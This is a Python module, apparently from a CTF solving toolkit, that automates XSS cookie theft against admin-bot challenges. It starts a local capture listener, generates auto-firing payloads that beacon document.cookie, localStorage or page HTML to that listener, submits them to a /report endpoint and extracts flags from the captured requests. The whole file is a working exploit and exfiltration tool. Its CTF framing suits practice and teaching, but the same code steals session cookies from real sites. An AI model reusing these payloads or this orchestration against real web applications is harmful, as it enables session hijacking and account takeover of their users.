"""Local out-of-band capture listener + admin-bot cookie-exfil orchestration.

For admin-bot XSS challenges where the bot carries a secret cookie
(``httponly:false``): this stands up a *local* HTTP listener, builds a
cookie-exfil XSS payload pointing at it, submits that payload to the challenge's
``/report`` endpoint, waits for the bot's browser to fire the payload, and reads
the flag out of the callback.

Captured data stays on this machine — the listener only records what the bot's
browser sends to it; nothing is forwarded to any third party.
"""
from __future__ import annotations

import socket
import threading
import time
from dataclasses import dataclass, field
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from urllib.parse import unquote, urlsplit

from ..flags.engine import FlagPatterns, compile_patterns, find_flags_deep
from .bot import build_visit_url, submit_report

# 1x1 transparent GIF so `new Image().src=...` resolves cleanly.
_GIF = bytes.fromhex(
    "47494638396101000100800000ffffff00000021f90401000000002c"
    "00000000010001000002024401003b")


@dataclass
class Hit:
    method: str
    path: str
    query: str
    headers: dict
    body: str
    client: str
    at: float

    def blob(self) -> str:
        """All attacker-visible text (URL-decoded) for flag scanning."""
        return unquote(f"{self.query} {self.body} {self.headers.get('cookie', '')}")


@dataclass
class ExfilResult:
    exfil_url: str
    payload: str
    visit_url: str
    report_status: int
    report_body: str
    hits: list[Hit] = field(default_factory=list)
    flags: list[str] = field(default_factory=list)


def local_ip() -> str:
    """Best-effort primary LAN IP (no packets are actually sent)."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except OSError:
        return "127.0.0.1"


class CaptureServer:
    """A tiny HTTP listener that records every request it receives."""

    def __init__(self, host: str = "0.0.0.0", port: int = 0):
        self.hits: list[Hit] = []
        self._lock = threading.Lock()
        server = self

        class Handler(BaseHTTPRequestHandler):
            def log_message(self, *a):
                pass

            def _record(self):
                length = int(self.headers.get("Content-Length") or 0)
                body = self.rfile.read(length).decode("utf-8", "replace") if length else ""
                parts = urlsplit(self.path)
                with server._lock:
                    server.hits.append(Hit(
                        self.command, parts.path, parts.query,
                        {k.lower(): v for k, v in self.headers.items()},
                        body, self.client_address[0], time.time()))
                self.send_response(200)
                self.send_header("Content-Type", "image/gif")
                self.send_header("Access-Control-Allow-Origin", "*")
                self.send_header("Content-Length", str(len(_GIF)))
                self.end_headers()
                self.wfile.write(_GIF)

            do_GET = _record
            do_POST = _record

        self.httpd = ThreadingHTTPServer((host, port), Handler)
        self.httpd.daemon_threads = True
        self.host, self.port = self.httpd.server_address[0], self.httpd.server_address[1]
        self._thread = threading.Thread(target=self.httpd.serve_forever, daemon=True)

    def start(self) -> "CaptureServer":
        self._thread.start()
        return self

    def stop(self) -> None:
        self.httpd.shutdown()
        self.httpd.server_close()

    def wait_for(self, timeout: float, predicate=None) -> Hit | None:
        end = time.monotonic() + timeout
        while time.monotonic() < end:
            with self._lock:
                for h in self.hits:
                    if predicate is None or predicate(h):
                        return h
            time.sleep(0.2)
        return None

    def __enter__(self):
        return self.start()

    def __exit__(self, *exc):
        self.stop()


_SINKS = {
    "cookie": "document.cookie",
    "location": "document.location.href",
    "storage": "JSON.stringify(localStorage)",
    "body": "document.documentElement.innerHTML.slice(0,2000)",
}


def build_exfil_payload(exfil_url: str, *, tag: str = "h1", what: str = "cookie",
                        custom: str = "") -> str:
    """Build an auto-firing XSS payload that sends data to *exfil_url*.

    ``custom`` (if given) may contain ``{URL}`` (the exfil base) and ``{JS}``
    (the ready-made exfil expression) placeholders.
    """
    sink = _SINKS.get(what, "document.cookie")
    js = f"new Image().src={exfil_url!r}+'?c='+encodeURIComponent({sink})"
    if custom:
        return custom.replace("{URL}", exfil_url).replace("{JS}", js)
    # autofocus+onfocus fires without interaction on a focusable element.
    return f'<{tag} tabindex=1 autofocus onfocus="{js}">x</{tag}>'


def capture_and_exfil(target_url: str, *, bot_base: str, inject_param: str,
                      report_path: str = "/report", report_field: str = "url",
                      listen_host: str = "0.0.0.0", listen_port: int = 0,
                      listener_url: str = "", xss_payload: str = "",
                      xss_tag: str = "h1", exfil_what: str = "cookie",
                      wait: float = 15.0, timeout: float = 12.0, cookie: str = "",
                      flag_patterns: FlagPatterns | None = None) -> ExfilResult:
    """Full admin-bot exfil: listen, build payload, report it, capture the flag."""
    patterns = flag_patterns or compile_patterns()
    server = CaptureServer(listen_host, listen_port).start()
    try:
        if listener_url:
            exfil_url = listener_url
        else:
            host = urlsplit(bot_base).hostname
            visible = "127.0.0.1" if host in ("127.0.0.1", "localhost") else local_ip()
            exfil_url = f"http://{visible}:{server.port}/"

        if xss_payload:
            payload = xss_payload.replace("{URL}", exfil_url)
        else:
            payload = build_exfil_payload(exfil_url, tag=xss_tag, what=exfil_what)

        visit = build_visit_url(bot_base=bot_base, inject_param=inject_param, payload=payload)
        reply = submit_report(target_url, visit, report_path=report_path,
                              report_field=report_field, timeout=timeout, cookie=cookie)

        def has_flag(h: Hit) -> bool:
            return bool(find_flags_deep(h.blob(), patterns))

        hit = server.wait_for(wait, has_flag)
        flags: list[str] = []
        if hit:
            flags = [m.value for m in find_flags_deep(hit.blob(), patterns)]
        with server._lock:
            all_hits = list(server.hits)
        return ExfilResult(exfil_url=exfil_url, payload=payload, visit_url=visit,
                           report_status=reply.status, report_body=reply.text,
                           hits=all_hits, flags=flags)
    finally:
        server.stop()
